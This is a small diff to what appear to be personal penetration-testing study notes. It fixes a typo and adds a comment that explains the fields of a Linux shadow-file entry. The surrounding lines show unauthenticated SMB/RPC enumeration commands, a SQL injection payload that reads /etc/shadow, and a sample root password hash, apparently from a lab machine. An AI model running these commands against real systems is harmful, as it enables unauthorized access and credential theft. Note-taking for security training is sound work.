@@ -243,7 +243,7 @@ nmblookup -A 192.223.132.3
 #List available shares to connect to (w/o authenticating) / Also gives the samba server description in the comments
 smbclient -L 192.223.132.3 -N
 
-#Connect with emoty user name and no pass
+#Connect with empty user name and no pass
 rpcclient -U "" -N 192.223.132.3
 
 #another tool to ind the OS, users and bunch of other stuff
@@ -527,7 +527,7 @@ select load_file("/etc/shadow")
 #can see the system pwd hash for users here
 #eg chunk with hash inside
 root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
-#eg hash (not sure how to tell whr it starts/ends from the chunk but oh well)
+#eg hash (not sure how to tell whr it starts/ends from the chunk but oh well) --> (future update: %no.% is the hash type, $rand$ is the salt, then everything until the : is the pwd hash. Numbers after are pw length reqs, last login, date of expiry etc)
 S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/
 ```
 
